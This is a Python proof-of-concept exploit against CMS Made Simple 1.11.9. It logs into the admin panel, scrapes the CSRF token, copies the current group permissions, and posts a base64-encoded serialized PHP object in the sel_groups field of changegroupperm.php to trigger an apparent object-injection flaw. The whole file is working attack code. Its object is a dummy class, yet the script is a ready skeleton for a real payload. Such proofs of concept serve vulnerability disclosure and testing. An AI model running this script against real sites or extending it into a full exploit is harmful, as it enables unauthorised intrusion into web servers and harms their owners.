# CMS Made Simple (1.11.9) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [ADMINID] [ADMINPW]")
    exit()

def login(baseurl, adminid, adminpw):
    URL = "{}{}".format(baseurl, "/admin/login.php")
    login_data = {
            "username": adminid,
            "password": adminpw,
            "loginsubmit": "Submit"
            }
    with requests.Session() as session:
        r = session.post(URL, data = login_data)
        if(r.text.find("login.php") > -1):
            print("[!] Login Failed!");
            exit()
        else:
            return session

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 4):
    printUsageAndExit()

BASEURL = sys.argv[1]
ADMINID = sys.argv[2]
ADMINPW = sys.argv[3]

# Get Token (_sx_)
session = login(BASEURL, ADMINID, ADMINPW)
sx_token_req = session.get("{}{}".format(BASEURL, "/admin/index.php"))
soup = BeautifulSoup(sx_token_req.text, features="html.parser")
changeperm_url = soup.find("a", {"class": "groupperms"})['href']
sx_token = changeperm_url.split("=")[1]
PAYLOAD = {
        "_sx_": sx_token,
        'submitted': '1'
        }

# Get original permission setting
get_origin_set = session.get("{}{}{}".format(BASEURL, "/admin/", changeperm_url))
soup = BeautifulSoup(get_origin_set.text, features="html.parser")
permtable = soup.find("table", {"class": "pagetable", "id": "permtable"})
for permission_td in permtable.findAll("td"):
    perm_box = permission_td.find("input")
    if perm_box is not None:
        if(perm_box.has_attr('checked') and not perm_box.has_attr('disabled')):
            PAYLOAD[perm_box['name']] = '1'

# Submit PAYLOAD
TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'
PAYLOAD['sel_groups'] = base64.b64encode(TRIGGER_INPUT.encode("ascii"))
change_perm = session.post("{}{}".format(BASEURL, "/admin/changegroupperm.php"),
                            data = PAYLOAD)
# print(change_perm.text)
